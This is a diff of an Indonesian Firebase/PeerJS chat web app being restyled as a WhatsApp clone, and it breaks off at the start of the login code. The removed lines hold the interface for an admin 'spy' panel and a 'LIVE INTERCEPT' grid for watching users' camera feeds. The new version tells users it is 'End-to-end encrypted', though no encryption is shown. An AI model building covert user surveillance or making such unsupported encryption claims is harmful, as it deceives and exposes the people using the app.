@@ -3,15 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>TitusChat V29 Supreme | Omni-Cloud Server</title>
-  
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
+  <title>TitusChat Ultimate | WA Web Clone</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  
-  <!-- PeerJS untuk P2P WebRTC (Video Call & CCTV Admin) -->
   <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
 
-  <!-- Import Firebase V10 Modular SDK -->
   <script type="importmap">
     {
       "imports": {
@@ -22,302 +17,229 @@
   </script>
 
   <style>
-    /* ================= SUPREME LUXURY CSS ================= */
+    /* OMNI-THEME WHATSAPP CLONE */
     :root {
-      --bg-deep: #050505;
-      --bg-glass: rgba(20, 20, 20, 0.7);
-      --gold-primary: #D4AF37;
-      --gold-glow: #F3E5AB;
-      --border-glass: rgba(212, 175, 55, 0.2);
-      --text-main: #F8F9FA;
-      --text-muted: #A0AAB2;
-      --accent-danger: #FF3B30;
-      --msg-in: rgba(30, 30, 30, 0.9);
-      --msg-out: linear-gradient(135deg, #997A00, #4d3d00);
+      --bg-main: #111b21; --bg-chat: #0b141a; --bg-header: #202c33; --bg-search: #202c33;
+      --text-main: #e9edef; --text-muted: #8696a0; --accent-wa: #00a884;
+      --msg-in: #202c33; --msg-out: #005c4b; --border-color: #222d34;
     }
-
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body { background: var(--bg-main); color: var(--text-main); height: 100vh; overflow: hidden; display: flex; }
     
-    body { 
-      background: radial-gradient(circle at 50% 0%, #1a1811 0%, #050505 100%);
-      color: var(--text-main); height: 100vh; width: 100vw; overflow: hidden; display: flex;
-    }
-
-    ::-webkit-scrollbar { width: 5px; }
-    ::-webkit-scrollbar-thumb { background: var(--border-glass); border-radius: 10px; }
-
-    /* ================= LAYAR AUTENTIKASI ================= */
-    #auth-screen {
-      position: fixed; inset: 0; z-index: 9999; display: flex; align-items: center; justify-content: center;
-      background: radial-gradient(circle at center, #1a1500 0%, #000 100%);
-    }
-
-    .auth-card {
-      background: var(--bg-glass); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-      border: 1px solid var(--border-glass); border-radius: 24px; padding: 50px 40px;
-      width: 100%; max-width: 420px; text-align: center; box-shadow: 0 10px 40px rgba(212,175,55,0.15);
-    }
-
-    .auth-logo { font-size: 60px; color: var(--gold-primary); margin-bottom: 10px; }
-    .auth-title { font-size: 26px; font-weight: 800; color: var(--gold-glow); margin-bottom: 25px; }
-
-    .input-group { position: relative; margin-bottom: 15px; }
-    .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--gold-primary); }
-    .input-group input {
-      width: 100%; background: rgba(0,0,0,0.5); border: 1px solid var(--border-glass); color: #fff;
-      padding: 15px 15px 15px 45px; border-radius: 12px; font-size: 15px; outline: none; transition: 0.3s;
-    }
-    .input-group input:focus { border-color: var(--gold-glow); background: rgba(0,0,0,0.8); }
-
-    .btn-supreme {
-      width: 100%; background: linear-gradient(135deg, var(--gold-primary), #997A00); color: #000;
-      border: none; padding: 15px; border-radius: 12px; font-weight: 800; font-size: 15px;
-      cursor: pointer; transition: 0.3s; margin-top: 10px; text-transform: uppercase; letter-spacing: 1px;
-    }
-    .btn-supreme:hover { filter: brightness(1.2); transform: translateY(-2px); }
+    /* UTILS & BUTTONS */
+    .hidden { display: none !important; }
+    .btn-icon { background: transparent; border: none; color: var(--text-muted); font-size: 20px; cursor: pointer; transition: 0.2s; padding: 8px; border-radius: 50%; }
+    .btn-icon:hover { color: var(--text-main); background: rgba(255,255,255,0.1); }
+    .avatar { width: 40px; height: 40px; border-radius: 50%; background-color: var(--text-muted); background-size: cover; background-position: center; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #fff; overflow: hidden; cursor: pointer; }
     
-    .auth-switch { margin-top: 20px; font-size: 13px; color: var(--text-muted); cursor: pointer; }
-    .auth-switch b { color: var(--gold-primary); }
+    /* MODALS & OVERLAYS */
+    .modal-overlay { position: fixed; inset: 0; background: rgba(11,20,26,0.85); z-index: 9999; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(4px); }
+    .modal-box { background: var(--bg-header); width: 400px; border-radius: 12px; padding: 25px; box-shadow: 0 15px 50px rgba(0,0,0,0.5); }
+    .modal-box h2 { margin-bottom: 20px; font-weight: 400; }
+    .input-auth { width: 100%; background: var(--bg-search); border: 1px solid var(--border-color); color: #fff; padding: 12px; border-radius: 8px; margin-bottom: 15px; outline: none; }
+    .input-auth:focus { border-color: var(--accent-wa); }
+    .btn-auth { width: 100%; background: var(--accent-wa); color: #111b21; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
 
-    /* ================= APLIKASI UTAMA (WHATSAPP CLONE) ================= */
-    #app-main { display: none; width: 100%; height: 100%; padding: 20px; gap: 20px; }
-
-    /* SIDEBAR LOKAL */
-    .sidebar {
-      width: 380px; background: var(--bg-glass); backdrop-filter: blur(20px); border: 1px solid var(--border-glass);
-      border-radius: 20px; display: flex; flex-direction: column; overflow: hidden;
-    }
-
-    .sidebar-header {
-      padding: 20px; background: rgba(0,0,0,0.4); border-bottom: 1px solid var(--border-glass);
-      display: flex; justify-content: space-between; align-items: center;
-    }
-    
-    .profile-info { display: flex; align-items: center; gap: 12px; }
-    .avatar { width: 45px; height: 45px; border-radius: 50%; background: var(--gold-primary); color: #000; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 18px; }
-    .profile-text h3 { font-size: 15px; color: #fff; }
-    .profile-text p { font-size: 11px; color: var(--accent-danger); font-weight: bold; }
-    .profile-text p.connected { color: #34C759; }
-
-    .header-icons { display: flex; gap: 15px; font-size: 18px; color: var(--text-muted); }
-    .header-icons i { cursor: pointer; transition: 0.2s; }
-    .header-icons i:hover { color: var(--gold-primary); }
-
+    /* LAYOUT UTAMA */
+    .sidebar { width: 30%; min-width: 350px; background: var(--bg-main); border-right: 1px solid var(--border-color); display: flex; flex-direction: column; }
+    .header { height: 60px; background: var(--bg-header); display: flex; justify-content: space-between; align-items: center; padding: 10px 16px; }
+    .search-bar { padding: 8px 12px; background: var(--bg-main); display: flex; align-items: center; border-bottom: 1px solid var(--border-color); }
+    .search-input { flex: 1; background: var(--bg-search); border-radius: 8px; padding: 8px 15px; display: flex; align-items: center; }
+    .search-input input { background: transparent; border: none; color: #fff; width: 100%; margin-left: 15px; outline: none; }
     .chat-list { flex: 1; overflow-y: auto; }
-    .chat-item { display: flex; align-items: center; padding: 15px 20px; gap: 15px; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.03); transition: 0.2s; }
-    .chat-item:hover, .chat-item.active { background: rgba(212,175,55,0.08); border-left: 4px solid var(--gold-primary); }
-    .chat-details { flex: 1; overflow: hidden; }
-    .chat-top { display: flex; justify-content: space-between; margin-bottom: 5px; }
-    .chat-name { font-weight: 600; font-size: 15px; color: #fff; }
-    .chat-msg { font-size: 13px; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .chat-item { display: flex; align-items: center; padding: 12px 15px; gap: 15px; cursor: pointer; border-bottom: 1px solid var(--border-color); }
+    .chat-item:hover, .chat-item.active { background: var(--bg-header); }
+    .chat-info { flex: 1; overflow: hidden; }
+    .chat-top { display: flex; justify-content: space-between; margin-bottom: 4px; }
+    .chat-name { font-size: 16px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .chat-preview { font-size: 13px; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
-    /* AREA OBROLAN */
-    .chat-area {
-      flex: 1; background: var(--bg-glass); backdrop-filter: blur(20px); border: 1px solid var(--border-glass);
-      border-radius: 20px; display: flex; flex-direction: column; overflow: hidden; position: relative;
-    }
-
-    .empty-chat { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-    .empty-chat i { font-size: 80px; color: var(--border-glass); margin-bottom: 20px; }
-    .empty-chat h1 { font-size: 26px; font-weight: 300; color: var(--gold-glow); }
-
-    .active-chat { display: none; flex-direction: column; height: 100%; }
-    .chat-header {
-      padding: 15px 25px; background: rgba(0,0,0,0.4); border-bottom: 1px solid var(--border-glass);
-      display: flex; justify-content: space-between; align-items: center;
-    }
-    .chat-header-user { display: flex; align-items: center; gap: 15px; }
+    .chat-area { flex: 1; background: var(--bg-chat); display: flex; flex-direction: column; position: relative; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-blend-mode: multiply; }
+    .empty-state { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; background: var(--bg-main); }
+    .chat-messages { flex: 1; overflow-y: auto; padding: 20px 5%; display: flex; flex-direction: column; gap: 8px; }
+    .bubble { max-width: 65%; padding: 8px 12px; border-radius: 8px; font-size: 14.5px; position: relative; line-height: 1.4; }
+    .bubble.in { background: var(--msg-in); align-self: flex-start; border-top-left-radius: 0; }
+    .bubble.out { background: var(--msg-out); align-self: flex-end; border-top-right-radius: 0; }
+    .bubble img { max-width: 100%; border-radius: 6px; margin-bottom: 5px; }
+    .msg-meta { font-size: 11px; color: rgba(255,255,255,0.6); float: right; margin: 5px 0 -2px 10px; }
     
-    .messages-container {
-      flex: 1; padding: 25px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px;
-    }
-    .msg-bubble { max-width: 70%; padding: 12px 18px; border-radius: 16px; font-size: 14.5px; position: relative; }
-    .msg-in { background: var(--msg-in); align-self: flex-start; border-bottom-left-radius: 4px; }
-    .msg-out { background: var(--msg-out); align-self: flex-end; border-bottom-right-radius: 4px; color: #fff; }
-    .msg-time { font-size: 10px; opacity: 0.6; text-align: right; margin-top: 5px; }
-
-    .chat-input { padding: 15px 25px; background: rgba(0,0,0,0.4); border-top: 1px solid var(--border-glass); display: flex; align-items: center; gap: 15px; }
-    .chat-input input {
-      flex: 1; background: rgba(0,0,0,0.5); border: 1px solid var(--border-glass); border-radius: 20px;
-      padding: 12px 20px; color: #fff; font-size: 15px; outline: none;
-    }
-    .btn-send-msg { background: transparent; border: none; color: var(--gold-primary); font-size: 22px; cursor: pointer; }
-
-    /* ================= DASHBOARD ADMIN & CCTV ================= */
-    .admin-overlay {
-      position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 99999; display: none; padding: 30px;
-    }
-    .admin-panel { width: 100%; height: 100%; border: 1px solid var(--accent-danger); border-radius: 20px; display: flex; flex-direction: column; background: #0a0a0a; }
-    .admin-header { padding: 20px; background: #111; border-bottom: 1px solid var(--accent-danger); display: flex; justify-content: space-between; align-items: center; }
-    .admin-content { flex: 1; padding: 20px; overflow-y: auto; }
+    .chat-footer { background: var(--bg-header); padding: 10px 16px; display: flex; align-items: center; gap: 15px; position: relative; }
+    .input-box { flex: 1; background: var(--bg-search); border-radius: 8px; padding: 10px 15px; }
+    .input-box input { width: 100%; background: transparent; border: none; color: #fff; outline: none; font-size: 15px; }
     
-    .admin-table { width: 100%; border-collapse: collapse; background: #111; border-radius: 12px; }
-    .admin-table th, .admin-table td { padding: 15px; text-align: left; border-bottom: 1px solid #222; font-size: 14px; }
-    .admin-table th { color: var(--accent-danger); }
-    
-    .btn-spy { background: rgba(255,59,48,0.1); color: var(--accent-danger); border: 1px solid var(--accent-danger); padding: 8px 12px; border-radius: 6px; cursor: pointer; font-weight: bold; }
-    .btn-spy:hover { background: var(--accent-danger); color: #000; }
+    /* ATTACHMENT MENU */
+    .attach-menu { position: absolute; bottom: 60px; left: 15px; background: var(--bg-header); border-radius: 12px; padding: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; z-index: 100; transition: 0.2s; }
+    .attach-item { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; font-size: 12px; color: var(--text-muted); }
+    .attach-item .icon-circle { width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; color: #fff; }
+    .attach-item:hover { color: #fff; }
 
-    /* CCTV GRID */
-    .cctv-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; padding: 20px; }
-    .cctv-card { background: #111; border: 1px solid #333; border-radius: 12px; overflow: hidden; position: relative; aspect-ratio: 16/9; }
-    .cctv-card video { width: 100%; height: 100%; object-fit: cover; }
-    .cctv-badge { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.8); color: var(--accent-danger); padding: 5px 10px; font-family: monospace; font-size: 11px; border: 1px solid var(--accent-danger); }
+    /* WEBRTC CALL UI */
+    .call-screen { position: absolute; inset: 0; background: #000; z-index: 1000; display: flex; flex-direction: column; }
+    .call-header { padding: 20px; display: flex; justify-content: space-between; align-items: center; background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent); position: absolute; top:0; width:100%; z-index: 10; }
+    .call-video-grid { flex: 1; display: grid; gap: 5px; background: #111; padding: 50px 10px 90px 10px; align-items: center; justify-content: center; }
+    .call-video-grid.single { grid-template-columns: 1fr; }
+    .call-video-grid.multi { grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); }
+    .video-box { position: relative; width: 100%; height: 100%; background: #222; border-radius: 12px; overflow: hidden; border: 1px solid #333; }
+    .video-box video { width: 100%; height: 100%; object-fit: cover; }
+    .video-name { position: absolute; bottom: 10px; left: 10px; background: rgba(0,0,0,0.6); padding: 4px 8px; border-radius: 6px; font-size: 12px; }
+    .call-controls { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); display: flex; gap: 20px; background: rgba(32,44,51,0.9); padding: 15px 30px; border-radius: 30px; z-index: 10; }
+    .btn-call-act { width: 50px; height: 50px; border-radius: 50%; border: none; background: rgba(255,255,255,0.1); color: #fff; font-size: 20px; cursor: pointer; }
+    .btn-call-act.end { background: var(--accent-danger); }
+    .pip-video { position: absolute; bottom: 100px; right: 20px; width: 120px; height: 160px; border-radius: 12px; border: 2px solid #fff; z-index: 15; background: #000; overflow: hidden; }
+
+    /* PROFILE EDIT UI */
+    .drawer { position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: var(--bg-main); z-index: 50; transition: 0.3s; display: flex; flex-direction: column; }
+    .drawer.open { left: 0; }
+    .drawer-header { height: 108px; background: var(--bg-header); display: flex; align-items: flex-end; padding: 20px; color: #fff; font-size: 18px; font-weight: 500; gap: 20px; }
+    .drawer-body { padding: 30px; text-align: center; }
+    .profile-pic-edit { width: 200px; height: 200px; border-radius: 50%; margin: 0 auto 30px; background: #333; position: relative; overflow: hidden; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+    .profile-pic-edit img { width: 100%; height: 100%; object-fit: cover; }
+    .profile-pic-edit .overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.5); display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; opacity: 0; transition: 0.2s; }
+    .profile-pic-edit:hover .overlay { opacity: 1; }
   </style>
 </head>
 <body>
 
-  <!-- ================= LAYAR LOGIN / REGISTER ================= -->
-  <div id="auth-screen">
-    <!-- FORM LOGIN -->
-    <div class="auth-card" id="card-login">
-      <i class="fa-solid fa-cloud auth-logo"></i>
-      <h1 class="auth-title">Cloud Login</h1>
-      <form id="form-login">
-        <div class="input-group">
-          <i class="fa-solid fa-at"></i>
-          <input type="text" id="log-user" placeholder="Username (cth: @titus)" required>
-        </div>
-        <div class="input-group">
-          <i class="fa-solid fa-key"></i>
-          <input type="password" id="log-pass" placeholder="Password" required>
-        </div>
-        <button type="submit" class="btn-supreme">Hubungkan ke Server</button>
-      </form>
-      <div class="auth-switch" onclick="toggleAuth('register')">Belum punya akses? <b>Daftar Akun Server</b></div>
-    </div>
-
-    <!-- FORM REGISTER -->
-    <div class="auth-card" id="card-register" style="display: none;">
-      <i class="fa-solid fa-server auth-logo"></i>
-      <h1 class="auth-title">Daftar Global</h1>
-      <form id="form-register">
-        <div class="input-group">
-          <i class="fa-solid fa-user"></i>
-          <input type="text" id="reg-name" placeholder="Nama Lengkap" required>
-        </div>
-        <div class="input-group">
-          <i class="fa-solid fa-at"></i>
-          <input type="text" id="reg-user" placeholder="Buat Username Unik" required>
-        </div>
-        <div class="input-group">
-          <i class="fa-solid fa-key"></i>
-          <input type="password" id="reg-pass" placeholder="Buat Password" required>
-        </div>
-        <button type="submit" class="btn-supreme">Daftar & Sinkronisasi</button>
-      </form>
-      <div class="auth-switch" onclick="toggleAuth('login')">Sudah terdaftar? <b>Kembali Login</b></div>
+  <!-- AUTHENTICATION -->
+  <div class="modal-overlay" id="auth-modal">
+    <div class="modal-box">
+      <div style="text-align:center; margin-bottom:20px; color:var(--accent-wa); font-size:40px;"><i class="fa-brands fa-whatsapp"></i></div>
+      <h2>Masuk TitusChat</h2>
+      <input type="text" id="auth-user" class="input-auth" placeholder="Username (cth: @titus)">
+      <input type="text" id="auth-name" class="input-auth" placeholder="Nama Profil">
+      <button class="btn-auth" onclick="login()">Terhubung ke Cloud</button>
     </div>
   </div>
 
-  <!-- ================= APLIKASI CHAT UTAMA ================= -->
-  <div id="app-main">
-    
-    <!-- SIDEBAR -->
-    <aside class="sidebar">
-      <div class="sidebar-header">
-        <div class="profile-info">
-          <div class="avatar" id="my-avatar">U</div>
-          <div class="profile-text">
-            <h3 id="my-name">Nama Saya</h3>
-            <p id="server-status" class="connected">SERVER DISCONNECTED</p>
-          </div>
-        </div>
-        <div class="header-icons">
-          <i class="fa-solid fa-shield-halved" id="btn-admin" style="display:none; color:var(--accent-danger);" title="Admin Dashboard" onclick="openAdmin()"></i>
-          <i class="fa-solid fa-right-from-bracket" title="Keluar" onclick="location.reload()"></i>
-        </div>
+  <!-- PROFILE DRAWER (EDIT PROFILE) -->
+  <div class="drawer" id="profile-drawer">
+    <div class="drawer-header">
+      <i class="fa-solid fa-arrow-left btn-icon" style="color:#fff;" onclick="closeProfile()"></i>
+      <span>Profil</span>
+    </div>
+    <div class="drawer-body">
+      <div class="profile-pic-edit" onclick="document.getElementById('upload-photo').click()">
+        <img id="my-profile-img" src="" style="display:none;">
+        <i class="fa-solid fa-camera" id="my-profile-icon" style="font-size:50px; color:#8696a0;"></i>
+        <div class="overlay"><i class="fa-solid fa-camera"></i><br><span style="font-size:12px; margin-top:5px;">UBAH FOTO PROFIL</span></div>
       </div>
+      <input type="file" id="upload-photo" accept="image/*" class="hidden" onchange="uploadProfilePhoto(event)">
       
-      <div class="chat-list" id="chat-list">
-        <!-- JS merender kontak secara real-time di sini -->
-        <div style="padding: 20px; text-align: center; color: var(--text-muted);"><i class="fa-solid fa-spinner fa-spin"></i> Menghubungkan ke Cloud...</div>
+      <div style="text-align: left; background: var(--bg-main); padding: 15px 30px;">
+        <p style="color: var(--accent-wa); font-size: 14px; margin-bottom: 10px;">Nama Anda</p>
+        <div style="display:flex; justify-content:space-between; border-bottom:2px solid var(--accent-wa); padding-bottom:5px;">
+          <input type="text" id="edit-name" style="background:transparent; border:none; color:#fff; font-size:16px; outline:none; width:100%;">
+          <i class="fa-solid fa-pen btn-icon" onclick="saveProfile()"></i>
+        </div>
       </div>
-    </aside>
+    </div>
+  </div>
 
-    <!-- AREA CHAT -->
-    <main class="chat-area">
-      <div class="empty-chat" id="empty-chat">
-        <i class="fa-solid fa-crown"></i>
-        <h1 style="color: var(--gold-primary);">TitusChat Supreme</h1>
-        <p style="color: var(--text-muted); margin-top: 10px;">Enkripsi Cloud Real-Time. Hubungan Lintas Perangkat.</p>
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <header class="header">
+      <div class="avatar" id="my-avatar" onclick="openProfile()">U</div>
+      <div style="display:flex; gap:10px;">
+        <button class="btn-icon" onclick="alert('Fitur Komunitas: Menghubungkan multi-grup sedang disiapkan.')"><i class="fa-solid fa-users"></i></button>
+        <button class="btn-icon" onclick="alert('Status WA: Fitur cerita 24 jam terenkripsi E2E.')"><i class="fa-solid fa-circle-notch"></i></button>
+        <button class="btn-icon" onclick="createGroup()"><i class="fa-solid fa-message"></i></button>
+        <button class="btn-icon" onclick="alert('Pengaturan: Privasi, Tema, Cadangkan Chat ke Drive.')"><i class="fa-solid fa-ellipsis-vertical"></i></button>
       </div>
+    </header>
+    <div class="search-bar">
+      <div class="search-input">
+        <i class="fa-solid fa-magnifying-glass" style="color:var(--text-muted)"></i>
+        <input type="text" id="search-box" placeholder="Cari atau mulai chat baru" onkeyup="renderChatList(this.value)">
+      </div>
+    </div>
+    <div class="chat-list" id="chat-list"></div>
+  </aside>
 
-      <div class="active-chat" id="active-chat">
-        <div class="chat-header">
-          <div class="chat-header-user">
-            <div class="avatar" id="chat-avatar">X</div>
-            <div>
-              <h3 id="chat-name" style="color: #fff; font-size: 16px;">Nama Lawan</h3>
-              <p style="color: var(--gold-primary); font-size: 12px;">Cloud Active</p>
-            </div>
+  <!-- CHAT AREA -->
+  <main class="chat-area">
+    <div class="empty-state" id="empty-state">
+      <h1 style="font-weight:300;">TitusChat untuk Web</h1>
+      <p style="color:var(--text-muted); margin-top:10px;">Kirim pesan, telepon, dan konferensi secara gratis.<br><i class="fa-solid fa-lock"></i> End-to-end encrypted.</p>
+    </div>
+
+    <div class="hidden" id="active-chat" style="display:flex; flex-direction:column; height:100%;">
+      <header class="header">
+        <div style="display:flex; align-items:center; gap:15px;">
+          <div class="avatar" id="chat-avatar"></div>
+          <div>
+            <h3 id="chat-name" style="font-size:16px; font-weight:500;">Name</h3>
+            <p id="chat-status" style="font-size:13px; color:var(--text-muted);">online</p>
           </div>
         </div>
-
-        <div class="messages-container" id="messages-container">
-          <!-- JS merender pesan real-time di sini -->
+        <div style="display:flex; gap:10px;">
+          <button class="btn-icon" onclick="startCall(true)"><i class="fa-solid fa-video"></i></button>
+          <button class="btn-icon" onclick="startCall(false)"><i class="fa-solid fa-phone"></i></button>
+          <button class="btn-icon" onclick="alert('Fitur Pencarian dalam obrolan')"><i class="fa-solid fa-magnifying-glass"></i></button>
+          <button class="btn-icon" onclick="alert('Menu: Hapus Chat, Bisukan, Blokir, Meta AI.')"><i class="fa-solid fa-ellipsis-vertical"></i></button>
         </div>
-
-        <div class="chat-input">
-          <input type="text" id="msg-input" placeholder="Ketik pesan server Anda..." autocomplete="off">
-          <button class="btn-send-msg" id="btn-send"><i class="fa-solid fa-paper-plane"></i></button>
+      </header>
+      
+      <div class="chat-messages" id="messages-container"></div>
+      
+      <footer class="chat-footer">
+        <button class="btn-icon" onclick="alert('Pemilih Emoji, GIF, & Stiker')"><i class="fa-regular fa-face-smile"></i></button>
+        <button class="btn-icon" onclick="toggleAttach()"><i class="fa-solid fa-plus"></i></button>
+        
+        <div class="attach-menu hidden" id="attach-menu">
+          <div class="attach-item" onclick="document.getElementById('file-upload').click()"><div class="icon-circle" style="background:#007bfc;"><i class="fa-solid fa-image"></i></div>Foto & Video</div>
+          <div class="attach-item" onclick="alert('Kirim Dokumen PDF/Zip')"><div class="icon-circle" style="background:#7f66ff;"><i class="fa-solid fa-file-lines"></i></div>Dokumen</div>
+          <div class="attach-item" onclick="alert('Bagikan Lokasi Langsung (Live)')"><div class="icon-circle" style="background:#00a884;"><i class="fa-solid fa-location-dot"></i></div>Lokasi</div>
+          <div class="attach-item" onclick="alert('Buat Jajak Pendapat (Poll)')"><div class="icon-circle" style="background:#ffbc38;"><i class="fa-solid fa-chart-simple"></i></div>Polling</div>
+          <div class="attach-item" onclick="alert('Kirim Kontak')"><div class="icon-circle" style="background:#0099ff;"><i class="fa-solid fa-user"></i></div>Kontak</div>
+          <div class="attach-item" onclick="alert('Katalog Bisnis & WhatsApp Shop')"><div class="icon-circle" style="background:#1fa97e;"><i class="fa-solid fa-store"></i></div>Katalog</div>
         </div>
-      </div>
-    </main>
+        <input type="file" id="file-upload" class="hidden" accept="image/*,video/*" onchange="sendMedia(event)">
 
-  </div>
-
-  <!-- ================= DASHBOARD ADMIN & CCTV ================= -->
-  <div class="admin-overlay" id="admin-panel">
-    <div class="admin-panel">
-      <div class="admin-header">
-        <h2 style="color: var(--accent-danger);"><i class="fa-solid fa-server"></i> OMNI-SERVER COMMAND CENTER</h2>
-        <div>
-          <button class="btn-supreme" style="width:auto; padding:8px 15px; margin-right:10px;" onclick="openCCTV()"><i class="fa-solid fa-border-all"></i> BUKA CCTV GRID</button>
-          <button style="background:transparent; border:none; color:#fff; font-size:24px; cursor:pointer;" onclick="closeAdmin()"><i class="fa-solid fa-xmark"></i></button>
+        <div class="input-box">
+          <input type="text" id="msg-input" placeholder="Ketik pesan..." autocomplete="off">
         </div>
+        <button class="btn-icon" id="btn-mic" onclick="alert('Tahan untuk merekam pesan suara (Voice Note).')"><i class="fa-solid fa-microphone"></i></button>
+        <button class="btn-icon hidden" id="btn-send" onclick="sendMsg()"><i class="fa-solid fa-paper-plane"></i></button>
+      </footer>
+    </div>
+  </main>
+
+  <!-- WEBRTC CALL SCREEN (1-ON-1 & GROUP 32-MAX) -->
+  <div class="call-screen hidden" id="call-screen">
+    <div class="call-header">
+      <div style="color:#fff;">
+        <h2 id="call-title"><i class="fa-solid fa-lock" style="font-size:14px;"></i> End-to-end encrypted</h2>
+        <p id="call-subtitle" style="color:#aaa; font-size:14px;">Memanggil...</p>
       </div>
-      <div class="admin-content">
-        <table class="admin-table">
-          <thead>
-            <tr>
-              <th>Username</th>
-              <th>Nama Tampilan</th>
-              <th>Status Endpoint</th>
-              <th>Aksi Intelijen</th>
-            </tr>
-          </thead>
-          <tbody id="admin-table-body">
-            <!-- Render User Table -->
-          </tbody>
-        </table>
+      <button class="btn-icon" style="color:#fff;" onclick="alert('Ubah Background & Filter AR (Native API)')"><i class="fa-solid fa-wand-magic-sparkles"></i></button>
+    </div>
+    
+    <!-- GRID UNTUK VIDEO -->
+    <div class="call-video-grid single" id="video-grid">
+      <!-- Remote Video -->
+      <div class="video-box" id="main-remote-box">
+        <video id="remote-video" autoplay playsinline></video>
+        <div class="video-name" id="remote-name">Lawan Bicara</div>
       </div>
+      <!-- Local Video PiP -->
+      <video id="local-video" class="pip-video" autoplay muted playsinline></video>
+    </div>
+
+    <div class="call-controls">
+      <button class="btn-call-act" onclick="alert('Bagikan Layar (Screen Share)')"><i class="fa-solid fa-display"></i></button>
+      <button class="btn-call-act" id="mute-mic" onclick="toggleMute()"><i class="fa-solid fa-microphone"></i></button>
+      <button class="btn-call-act" id="mute-vid" onclick="toggleVideo()"><i class="fa-solid fa-video"></i></button>
+      <button class="btn-call-act end" onclick="endCall()"><i class="fa-solid fa-phone-slash"></i></button>
     </div>
   </div>
 
-  <!-- CCTV GRID OVERLAY -->
-  <div class="admin-overlay" id="cctv-overlay" style="z-index: 999999;">
-    <div style="width:100%; height:100%; background:#0a0a0a; display:flex; flex-direction:column;">
-      <div class="admin-header" style="border-bottom-color:#333;">
-        <h2 style="color:var(--accent-danger); animation:pulse 1s infinite;">🔴 LIVE INTERCEPT - SURVEILLANCE GRID</h2>
-        <button style="background:#222; color:#fff; padding:8px 15px; border:none; border-radius:6px; cursor:pointer;" onclick="closeCCTV()">Tutup CCTV</button>
-      </div>
-      <div class="cctv-grid" id="cctv-grid-container">
-        <!-- Render Video P2P di sini -->
-      </div>
-    </div>
-  </div>
-
-
-  <!-- ================= LOGIC JAVASCRIPT (MODULAR FIRESTORE & WEBRTC) ================= -->
   <script type="module">
-    // 1. IMPORT FIREBASE V10 SDK DARI CDN
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getFirestore, collection, doc, setDoc, getDoc, onSnapshot, addDoc, query, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+    import { getFirestore, collection, doc, setDoc, onSnapshot, addDoc, query, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-    // 2. KONFIGURASI FIREBASE CLOUD ASLI ANDA
+    // Konfigurasi Cloud Firebase
     const firebaseConfig = {
-      apiKey: "AIzaSyCoH5hWljWWyvbTPtKWmb8oiFo29azrFfw", // Kunci API Firebase Asli
+      apiKey: "AIzaSyCoH5hWljWWyvbTPtKWmb8oiFo29azrFfw",
       authDomain: "webtituscode.firebaseapp.com",
       projectId: "webtituscode",
       storageBucket: "webtituscode.firebasestorage.app",
@@ -325,318 +247,307 @@
       appId: "1:54782655519:web:f28fa7aabc89bf235e292a"
     };
 
-    // Inisialisasi Firebase App & Database Cloud
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // 3. VARIABEL GLOBAL (STATE)
-    let currentUser = null;
-    let activeChatUser = null;
-    let usersList = new Map();
-    let messagesList = [];
-    
-    // WebRTC PeerJS
-    let peerNode = null;
-    let activeCctvCalls = {};
+    let myProfile = null;
+    let targetId = null;
+    let isGroup = false;
+    let users = new Map();
+    let groups = new Map();
+    let messages = [];
 
-    // ==========================================
-    // BAGIAN A: FUNGSI AUTENTIKASI (LOGIN / REG)
-    // ==========================================
-    window.toggleAuth = function(mode) {
-      document.getElementById('card-login').style.display = mode === 'login' ? 'block' : 'none';
-      document.getElementById('card-register').style.display = mode === 'register' ? 'block' : 'none';
+    // WebRTC Peer
+    let peer = null;
+    let currentCall = null;
+    let localStream = null;
+
+    // ================= 1. AUTENTIKASI & PROFIL =================
+    window.login = async () => {
